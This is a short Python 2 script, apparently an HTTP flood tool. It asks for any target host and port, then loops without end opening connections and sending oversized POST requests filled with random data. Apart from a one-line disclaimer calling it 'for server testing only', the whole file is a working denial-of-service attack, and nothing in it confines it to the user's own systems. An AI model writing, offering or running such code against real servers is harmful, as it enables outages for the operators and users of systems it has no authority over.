import socket, httplib, time, urllib, random, os
os.system('cls' if os.name == 'nt' else 'clear')
print("It is the end user's responsibility to obey all applicable laws.This script is desinged for server testing only.")
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
u=raw_input('TARGET:\n(www.example.com)\n>')
p=input('port:\n>')
def b(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

i=0
while True:
 try:
  params = urllib.urlencode({'search': b(random.randint(6,100))})
  conn = httplib.HTTPConnection(u, p)
  conn.request("POST", '/', params*666, headers)
  i+=1
 except socket.error as e:
  print e
 print 'Connections Opened:',i
